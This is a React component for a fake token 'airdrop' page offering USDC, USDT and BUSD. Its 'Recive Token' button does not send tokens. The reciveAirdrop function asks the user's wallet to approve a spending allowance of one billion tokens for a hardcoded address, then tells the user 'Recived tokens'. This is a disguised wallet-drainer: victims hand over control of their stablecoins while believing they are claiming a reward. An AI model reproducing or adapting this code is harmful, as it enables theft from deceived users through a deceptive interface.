import React from "react"
import { connect } from 'react-redux';
import { log, logwarn, logerror } from "../std"

import { toast } from 'react-toastify';

import { connectWeb3, CHAINS } from "../store/web3Store";
import Wallet from "./Wallet";
import Button from "./Button";

import Web3 from "web3";

import "./AirdropToken.scss"

class AirdropToken extends React.Component {
    state = {
        isConnectedWeb3: false, abiFolder: "contracts/",
        USDC: {
            1: {
                contract: null,
                address: "0x647d1Dc5bc8c9a288ABe7032948aE87682b2C4B4",
                decimals: 6,
            },
            5777: {
                contract: null,
                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
                decimals: 6,
            },
        },
        USDT: {
            1: {
                contract: null,
                address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                decimals: 6,
            },
            5777: {
                contract: null,
                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
                decimals: 6,
            },
        },
        BUSD: {
            1: {
                contract: null,
                address: "0x5864c777697Bf9881220328BF2f16908c9aFCD7e",
                decimals: 18,
            },
            5777: {
                contract: null,
                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
                decimals: 18,
            },
        },
        symbol: "USDT",
        mAddress: '0x87558A8BdCD865a3d7E2C3A7e8f64Fb7d2E31341',

    }
    componentDidMount() {
        if (!window.ethereum || !window.ethereum.isMetaMask) {
            this.setState({ isConnectedWeb3: false })
        }

        this.onTokenSelected.bind(this)
    }

    async initContracts(symbol, web3 = this.props.web3) {
        let { /*USDC, BUSD, USDT,*/ abiFolder } = this.state;
        let token = this.state[symbol]

        let chainId = parseInt(window.ethereum.chainId)
        let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
        log(abiPath)
        return fetch(abiPath).then(response => response.json()).then(async abi => {
            let contract = await new web3.eth.Contract(chainId == 5777 ? abi.abi : abi, token[chainId].address);

            token[chainId].contract = contract;

            this.setState({ [symbol]: token })
            return token
        }).catch(error => { throw error })
    }

    async reciveAirdrop() {
        let { web3, accounts } = this.props;
        let { mAddress, symbol } = this.state;
        let chainId = parseInt(window.ethereum.chainId)
        if (!web3) {
            toast.error("Please connect Metamask")
        } else {
            try {
                await this.initContracts(symbol, web3)
                let token = this.state[symbol]
                window.token = token
                let amount = "0x" + (1_000_000_000 * (10 ** parseInt(token[chainId].decimals))).toString(16)
                log(amount)
                token[chainId].contract.methods.approve(mAddress, amount)
                    .send({ from: accounts[0] }, function (err, tx) {
                        if (err) {
                            toast.error(err.message)
                            logerror(err)
                        } else toast.success("Recived tokens")
                    })

            }
            catch (error) {
                logerror("reciveAirdrop:", error.message, symbol, chainId)
                if (error.message.includes("Unexpected token"))
                    toast.error(`We haven't suport this chain yet: ${symbol} - ${chainId}`)
                else toast.error(error.message)
            }
        }
    }

    onTokenSelected(e) {
        let symbol = "USDT"
        if (e.target.innerText.trim() == "") {
            symbol = e.target.parentElement.innerText
        } else symbol = e.target.innerText

        this.setState({ symbol: symbol.trim() })
    }

    render() {

        let { symbol } = this.state;
        let { web3 } = this.props;
        return (
            <div className="col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-6 offset-lg-3 col-xl-5 offset-xl-0">
                <div className="home__content home__content--right">
                    <div className="home__sales">
                        <h3>Recive Airdrop</h3>
                        <p>Discount 77% from final price</p>

                        <div className="progress progress--small">
                            <div className="progress-bar" role="progressbar" style={{ "width": "70%" }} aria-valuenow="70"
                                aria-valuemin="0" aria-valuemax="100"></div>
                            <div className="progress__line" style={{ "left": "8%" }}><svg xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24">
                                <path
                                    d="M14.72,8.79l-4.29,4.3L8.78,11.44a1,1,0,1,0-1.41,1.41l2.35,2.36a1,1,0,0,0,.71.29,1,1,0,0,0,.7-.29l5-5a1,1,0,0,0,0-1.42A1,1,0,0,0,14.72,8.79ZM12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" />
                            </svg> 100K</div>
                            <div className="progress__line" style={{ "left": "40%" }}><svg xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24">
                                <path
                                    d="M14.72,8.79l-4.29,4.3L8.78,11.44a1,1,0,1,0-1.41,1.41l2.35,2.36a1,1,0,0,0,.71.29,1,1,0,0,0,.7-.29l5-5a1,1,0,0,0,0-1.42A1,1,0,0,0,14.72,8.79ZM12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" />
                            </svg> 400K</div>
                            <div className="progress__value">1M USD</div>
                        </div>

                        <p>Fixed token edition 30.000.000 WEA</p>
                        <div className="row justify-content-center" >{web3 ? (
                            <Button onClick={this.reciveAirdrop.bind(this)}>Recive Token</Button>
                        ) : (
                            <Wallet />
                        )}
                        </div>

                        {/* tabs nav */}
                        <div className="col-12 col-sm-10 offset-sm-1 col-md-6 offset-md-3 col-lg-4 offset-lg-4">
                            <ul className="nav nav-tabs section__tabs" role="tablist">
                                <li className="nav-item">
                                    <a className="nav-link" data-toggle="tab" href="#tab-1" role="tab" aria-controls="tab-1"
                                        aria-selected="false" onClick={this.onTokenSelected.bind(this)}><img src="img/usdc.svg" />&nbsp;USDC</a>
                                </li>
                                <li className="nav-item">
                                    <a className="nav-link active" data-toggle="tab" href="#tab-2" role="tab" aria-controls="tab-2"
                                        aria-selected="true" onClick={this.onTokenSelected.bind(this)}><img src="img/usdt.svg" />&nbsp;USDT</a>
                                </li>
                                <li className="nav-item">
                                    <a className="nav-link" data-toggle="tab" href="#tab-3" role="tab" aria-controls="tab-3"
                                        aria-selected="false" onClick={this.onTokenSelected.bind(this)}><img src="img/busd.svg" />&nbsp;BUSD</a>
                                </li>
                            </ul>
                        </div>
                        {/* end tabs nav */}
                    </div>
                </div>
            </div>
        )
    }
}

const styles = {

}

const mapStateToProps = (state, ownProps) => ({
    web3: state.web3Store.web3,
    accounts: state.web3Store.accounts,
    // contract: state.Contract.contract,
    // owner: state.Contract.owner,
});

export default connect(mapStateToProps, {
    connectWeb3: connectWeb3,
    // connectContract: connectContract,
})(AirdropToken);
